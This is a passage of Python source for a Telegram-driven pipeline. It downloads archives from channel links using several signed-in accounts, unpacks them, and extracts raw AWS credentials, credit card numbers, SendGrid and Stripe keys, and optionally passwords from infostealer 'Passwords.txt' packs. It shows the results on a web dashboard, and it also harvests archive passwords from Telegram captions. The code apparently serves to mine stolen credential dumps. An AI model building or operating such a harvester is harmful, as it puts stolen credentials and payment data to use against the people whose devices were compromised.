            if not current or current.status not in {'pending', 'running'}:
                LOG.info('Skipping stopped ingest job', extra={'job_id': job_id, 'stage': 'web-ingest'})
                return
            LOG.info('Starting channel ingest', extra={'job_id': job_id, 'message_id': job_key, 'stage': 'web-ingest'})

            # Prefer the assigned session, then try every other online account.
            candidates: list[tuple[str | None, TelegramClient]] = []
            if preferred is not None:
                candidates.append((session_id, preferred))
            for sid, live in self.sessions.items():
                if not live.online:
                    continue
                if preferred is not None and live.client is preferred:
                    continue
                candidates.append((sid, live.client))
            if not candidates and preferred is not None:
                candidates.append((session_id, preferred))

            last_exc: BaseException | None = None
            messages = None
            used_client = preferred
            for sid, cand in candidates:
                try:
                    _, _, messages = await self._resolve_channel_message(cand, url)
                    used_client = cand
                    if sid and sid != session_id:
                        LOG.info(
                            'Resolved channel message with fallback session %s',
                            sid,
                            extra={'job_id': job_id, 'message_id': job_key, 'stage': 'web-ingest', 'session_id': sid},
                        )
                    break
                except Exception as exc:
                    last_exc = exc
                    if not self._is_session_access_error(exc):
                        raise
                    LOG.warning(
                        'Session cannot access message (%s); trying next account',
                        exc,
                        extra={'job_id': job_id, 'message_id': job_key, 'stage': 'web-ingest', 'session_id': sid},
                    )
                    continue
            if messages is None:
                raise last_exc or ValueError('Message is unavailable to all signed-in Telegram accounts')

            await asyncio.to_thread(
                self.db.update_progress, job_id, 'downloading', 0, 0,
                getattr(getattr(messages[0], 'file', None), 'name', None) or 'media', 1, len(messages),
            )
            await self.queue_messages(
                messages=messages, job_key=job_key, chat_id=0, user_id=0,
                source='channel-link', source_link=url, notify=False, existing_job_id=job_id,
            )
            LOG.info('Channel link download finished',extra={'job_id': job_id, 'message_id':job_key,'stage':'web-ingest'})
        except asyncio.CancelledError:
            await asyncio.to_thread(self.db.mark_failed, job_id, 'Stopped by operator')
            raise
        except FloodWaitError as exc:
            # Cap sleep so one flood-wait cannot freeze the whole ingest queue for hours.
            wait_for = min(int(exc.seconds) + 1, 90)
            LOG.warning(
                'Flood wait during channel ingest; pausing %ss (Telegram asked %ss)',
                wait_for, exc.seconds,
                extra={'job_id': job_id, 'message_id':job_key,'stage':'web-ingest'},
            )
            await asyncio.to_thread(self.db.mark_failed,job_id,f'FloodWaitError: retry after {exc.seconds}s')
            await asyncio.sleep(wait_for)
        except Exception as exc:
            LOG.exception('Channel link ingest failed',extra={'job_id': job_id, 'message_id':job_key,'stage':'web-ingest'})
            await asyncio.to_thread(self.db.mark_failed,job_id,f'{type(exc).__name__}: {exc}')

    async def ingest_supervisor(self):
        """Periodic reconciliation makes DB pending rows impossible to orphan."""
        LOG.info('Channel ingest worker online', extra={'stage': 'startup'})
        while True:
            try:
                self._ingest_worker_heartbeat = time.monotonic()
                if not self._stop_requested.is_set():
                    await self._schedule_pending_ingests()
                await asyncio.sleep(2.0)
            except asyncio.CancelledError:
                raise
            except Exception:
                LOG.exception('Ingest supervisor loop error; continuing', extra={'stage': 'web-ingest'})
                await asyncio.sleep(2.0)

    def register(self):
        """Telegram event handlers.

        Auto-ingest of group/private media uploads is intentionally disabled.
        Downloads are started only from the dashboard (channel link / scan).
        """
        if self.client is None:
            LOG.info(
                'No primary Telegram client for event handlers; dashboard channel ingest still works',
                extra={'stage': 'startup'},
            )
            return
        LOG.info(
            'Live Telegram auto-ingest disabled (group/private uploads are ignored)',
            extra={'stage': 'startup'},
        )

    async def process(self,job:Job):
        if self._stop_requested.is_set():
            await asyncio.to_thread(self.db.mark_failed, job.id, 'Stopped by operator')
            return
        current = await asyncio.to_thread(self.db.get_job, job.id)
        if not current or current.status not in {'pending', 'running'}:
            return
        await asyncio.to_thread(self.db.mark_running,job.id)
        await self.notify(job.chat_id,'🧰 Validating and extracting archive…',job.message_id)
        try:
            root=await asyncio.to_thread(self.extractor.process,job.message_id,[Path(p) for p in job.input_files])
            
            # Notify about scan start
            await asyncio.to_thread(
                self.db.update_progress, job.id, 'scanning', 0, 0, 'scanning credentials', 0, 0
            )
            await self.notify(job.chat_id,'🔎 Scanning for credentials in extracted files…',job.message_id)
            LOG.info('Starting credential scan',extra={'job_id':job.id,'message_id':job.message_id,'stage':'processing'})
            
            findings,summary=await asyncio.to_thread(
                scan_tree, root, self.s.max_scan_file_bytes, self.s.fingerprint_key, 8, self.s.output_dir
            )
            text,summary_json=await asyncio.to_thread(write_results,self.s.output_dir,job.message_id,findings,summary)
            await asyncio.to_thread(self.db.mark_completed,job.id,str(text),str(summary_json),summary)
            
            # Notify scan results
            scan_msg=f"✅ Scan Results:\n📄 Files scanned: {summary['files_scanned']}\n🔍 Findings: {summary['findings']}"
            await self.notify(job.chat_id,scan_msg,job.message_id)
            LOG.info('Credential scan complete',extra={'job_id':job.id,'message_id':job.message_id,'files_scanned':summary['files_scanned'],'findings':summary['findings'],'stage':'processing'})
            
            # Extract raw credentials for the dashboard. Never send secrets to Telegram.
            await self.notify(job.chat_id,'🔑 Extracting raw AWS credentials…',job.message_id)
            raw_creds=await asyncio.to_thread(
                extract_raw_credentials, root, 8, self.s.output_dir, self.s.max_scan_file_bytes
            )

            if raw_creds:
                await self.alert_credentials(job, raw_creds)
            else:
                LOG.info('No raw credentials found',extra={'job_id':job.id,'message_id':job.message_id,'stage':'processing'})

            await self.notify(job.chat_id,'💳 Scanning for credit cards…',job.message_id)
            raw_cards=await asyncio.to_thread(
                extract_credit_cards, root, 8, self.s.output_dir, self.s.max_scan_file_bytes
            )
            if raw_cards:
                await self.alert_credit_cards(job, raw_cards)
            else:
                LOG.info('No credit cards found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})

            # Login-password stealer extraction is opt-in. The default scan walks every
            # Passwords.txt in a pack, inserts millions of rows, and locks the dashboard.
            # Archive unlock passwords from Telegram captions are harvested separately.
            if os.getenv('SCAN_LOGIN_PASSWORDS', '').strip().lower() in {'1', 'true', 'yes'}:
                await self.notify(job.chat_id,'🔑 Scanning for passwords…',job.message_id)
                raw_passwords=await asyncio.to_thread(
                    extract_passwords, root, 8, self.s.output_dir, self.s.max_scan_file_bytes
                )
                if raw_passwords:
                    await self.alert_passwords(job, raw_passwords)
                else:
                    LOG.info('No passwords found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})
            else:
                LOG.info(
                    'Skipping login-password file scan',
                    extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'},
                )

            await self.notify(job.chat_id,'🔑 Scanning for SendGrid and Stripe keys…',job.message_id)
            raw_keys=await asyncio.to_thread(
                extract_api_keys, root, 8, self.s.output_dir, self.s.max_scan_file_bytes
            )
            if raw_keys:
                await self.alert_api_keys(job, raw_keys)
            else:
                LOG.info('No API keys found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})
            
            # Send redacted reports (best-effort — chat bans must not fail a completed scan).
            if job.chat_id and self.client is not None:
                try:
                    await self.client.send_file(
                        job.chat_id, str(text),
                        caption=f"📄 Redacted Report (Files: {summary['files_scanned']}, Findings: {summary['findings']})",
                        reply_to=job.message_id,
                    )
                    await self.client.send_file(
                        job.chat_id, str(summary_json),
                        caption='📊 Machine-readable summary (JSON)',
                        reply_to=job.message_id,
                    )
                except Exception:
                    LOG.exception(
                        'Could not send report files to chat',
                        extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'notification'},
                    )

            LOG.info('Job completed successfully',extra={'job_id':job.id,'message_id':job.message_id,'stage':'processing'})
        except Exception as exc:
            LOG.exception('Job failed',extra={'job_id':job.id,'message_id':job.message_id,'user_id':job.user_id,'stage':'processing'})
            await asyncio.to_thread(self.db.mark_failed,job.id,f'{type(exc).__name__}: {exc}')
            await self.notify(job.chat_id,f'❌ Processing failed: {type(exc).__name__}: {exc}',job.message_id)

    async def _run_job(self, item: QueueItem):
        try:
            job=await asyncio.to_thread(self.db.get_job,item.job_id)
            if job and job.status in {'pending','running'}:
                async with self.semaphore:
                    await self.process(job)
        finally:
            self.queue.task_done()

    async def worker(self):
        while True:
            item=await self.queue.get()
            task=asyncio.create_task(self._run_job(item), name=f'job-{item.job_id}')
            self._active_tasks.add(task)
            task.add_done_callback(self._active_tasks.discard)

    async def request_stop_all(self) -> int:
        """Cancel active downloads/extractions and mark pending/running jobs failed."""
        self._stop_generation += 1
        self._stop_requested.set()
        count = await asyncio.to_thread(self.db.stop_all_jobs)

        ingest_tasks = list(self._ingest_tasks.values())
        for task in ingest_tasks:
            task.cancel()
        if ingest_tasks:
            await asyncio.gather(*ingest_tasks, return_exceptions=True)
        self._ingest_tasks.clear()
        supervisor = self._ingest_supervisor_task
        if supervisor is not None and not supervisor.done():
            supervisor.cancel()
            await asyncio.gather(supervisor, return_exceptions=True)
        self._ingest_supervisor_task = None

        for task in list(self._active_tasks):
            task.cancel()

        # Drop extraction queue items; DB rows are already marked failed.
        while True:
            try:
                self.queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            else:
                self.queue.task_done()

        self._stop_requested.clear()
        LOG.info('Stop-all requested', extra={'stage': 'control', 'stopped': count})
        return count

    async def _session_watch_loop(self):
        while not self._shutdown.is_set():
            try:
                await self.refresh_session_statuses()
            except Exception:
                LOG.exception('Session watch failed', extra={'stage': 'session'})
            try:
                await asyncio.wait_for(self._shutdown.wait(), timeout=20)
            except asyncio.TimeoutError:
                pass

    async def request_shutdown(self) -> None:
        self._shutdown.set()
        for live in list(self.sessions.values()):
            try:
                await live.client.disconnect()
            except Exception:
                pass

    async def run(self):
        await asyncio.to_thread(self.db.initialize)
        try:
            await self.start_sessions()
        except AuthKeyDuplicatedError:
            LOG.error(
                'A Telegram session was used from another instance simultaneously; '
                'remove the revoked account from the dashboard and add a fresh string session',
                extra={'stage': 'startup'},
            )
            raise
        self.register()
        if self.client is not None:
            try:
                self._persist_session_string(self.client.session.save())
            except Exception:
                LOG.exception('Failed to mirror primary session to legacy path', extra={'stage': 'startup'})
        _, extract_jobs = await asyncio.to_thread(self.db.restore_interrupted_work)
        dedupe = await asyncio.to_thread(self.db.dedupe_channel_queue)
        if dedupe.get('removed'):
            LOG.info(
                'Removed %s duplicate pending channel job(s)',
                dedupe['removed'],
                extra={'stage': 'startup', 'links': dedupe.get('links'), 'candidates': dedupe.get('candidates')},
            )
        queued = await asyncio.to_thread(self.db.count_queued_channel_downloads)
        for job in extract_jobs:
            await self.queue.put(QueueItem(job.id))
        LOG.info(
            'Restored interrupted work: %s queued download(s), %s extraction(s); sessions online=%s/%s',
            queued, len(extract_jobs),
            sum(1 for s in self.sessions.values() if s.online),
            len(self.sessions),
            extra={'stage': 'startup'},
        )
        dashboard=Dashboard(self.s,self.db,self.passwords,self)
        server=uvicorn.Server(uvicorn.Config(dashboard.app,host=self.s.host,port=self.s.port,log_config=None,access_log=False))
        worker=asyncio.create_task(self.worker(),name='job-dispatcher')
        ingest=asyncio.create_task(self.ingest_supervisor(),name='channel-ingest-supervisor')
        watch=asyncio.create_task(self._session_watch_loop(),name='session-watch')
        web=asyncio.create_task(server.serve(),name='web-dashboard')
        self.kick_ingest()
        LOG.info('Telegram scanner and web dashboard started', extra={'stage': 'startup'})
        try:
            while not self._shutdown.is_set():
                online = [
                    s for s in self.sessions.values()
                    if s.online and s.client.is_connected()
                ]
                if self.sessions and not online:
                    LOG.warning('All Telegram sessions disconnected', extra={'stage': 'session'})
                    break
                await asyncio.sleep(1)
        finally:
            self._shutdown.set()
            server.should_exit=True
            worker.cancel(); ingest.cancel(); watch.cancel()
            await asyncio.gather(worker,ingest,watch,web,return_exceptions=True)
            for live in list(self.sessions.values()):
                try:
                    await live.client.disconnect()
                except Exception:
                    pass
            self._release_session_lock()

async def main():
    s = load_settings()
    configure_logging(s.log_level, s.data_root / 'activity-logs.json')
    pipeline = Pipeline(s)
    loop = asyncio.get_running_loop()

    def request_shutdown() -> None:
        loop.call_soon_threadsafe(lambda: asyncio.ensure_future(pipeline.request_shutdown()))

    if os.name == "nt":
        # ProactorEventLoop has no add_signal_handler; fall back to signal.signal.
        # Note: Windows never really delivers SIGTERM, but Ctrl+C (SIGINT) works.
        for sig in (signal.SIGINT, signal.SIGTERM):
            signal.signal(sig, lambda *_: request_shutdown())
    else:
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, request_shutdown)

    await pipeline.run()

if __name__=='__main__': asyncio.run(main())
